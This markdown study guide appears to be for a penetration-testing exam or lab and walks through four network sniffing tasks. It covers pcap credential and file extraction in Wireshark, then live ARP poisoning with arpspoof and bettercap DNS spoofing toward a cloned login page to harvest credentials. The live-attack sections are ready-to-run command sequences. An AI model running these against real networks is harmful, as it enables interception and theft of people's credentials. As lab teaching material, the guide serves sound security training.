# 07 Sniffing — full walkthroughs

---

## Walkthrough 1: "Find the username and password submitted in capture.pcap"

**Type:** credential extraction | **Difficulty:** easy | **Time:** 2–3 min

1. Open the pcap in Wireshark:
   ```bash
   wireshark capture.pcap &
   ```
2. Apply filter:
   ```
   http.request.method == "POST"
   ```
3. Click the POST packet → right-click → `Follow → HTTP Stream`.
4. In the stream you'll see the URL-encoded body:
   ```
   username=admin&password=P@ssw0rd123
   ```
5. **Answer:** `admin / P@ssw0rd123` (copy exactly, including case and symbols).

**Backup — FTP/Telnet creds:**
```
ftp.request.command == "USER" or ftp.request.command == "PASS"
telnet
```

**CLI backup:**
```bash
tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data
```

---

## Walkthrough 2: "What file was downloaded over HTTP in capture.pcap?"

**Type:** file extraction | **Difficulty:** easy | **Time:** 2 min

1. Wireshark → `File → Export Objects → HTTP`.
2. The dialog lists every HTTP object with filename, size, and content-type.
3. Note the filename (e.g. `invoice.pdf`) — or click `Save` to pull it out.
4. **Answer:** the filename, or if asked for hash: `md5sum invoice.pdf` after saving.

**Alt:** if it's SMB, use `Export Objects → SMB`.

---

## Walkthrough 3: "Perform ARP poisoning between 10.10.10.50 (victim) and 10.10.10.1 (gateway) and capture the victim's HTTP traffic"

**Type:** live MITM | **Difficulty:** medium | **Time:** 5 min

1. Enable forwarding — **critical**:
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```
2. Start arpspoof in two terminals:
   ```bash
   # Terminal 1
   sudo arpspoof -i eth0 -t 10.10.10.50 10.10.10.1
   # Terminal 2
   sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.50
   ```
3. Start capture:
   ```bash
   sudo tcpdump -i eth0 -w mitm.pcap 'host 10.10.10.50 and tcp port 80'
   ```
4. Let the victim browse. Stop with Ctrl-C.
5. Open `mitm.pcap` in Wireshark, filter `http.request.method == "POST"`, follow stream → read creds.
6. **Clean up:** kill both arpspoof processes — they'll send restoration packets automatically.

**Gotcha:** if the victim can't reach the internet mid-attack, IP forwarding is off. Fix it.

---

## Walkthrough 4: "Use bettercap to sniff traffic and DNS-spoof login.example.com to your IP"

**Type:** live MITM + DNS spoof | **Difficulty:** medium | **Time:** 5 min

1. Enable forwarding then launch:
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   sudo bettercap -iface eth0
   ```
2. Inside the bettercap prompt:
   ```
   net.probe on
   net.show
   set arp.spoof.targets 10.10.10.50
   arp.spoof on
   net.sniff on
   set dns.spoof.domains login.example.com
   set dns.spoof.address <LHOST>
   dns.spoof on
   ```
3. When the victim visits `http://login.example.com`, they hit **your** HTTP server. Host a cloned login page with [SET credential harvester](../08-social-engineering/walkthroughs.md).
4. **Answer:** capture the submitted creds in the fake page's log.
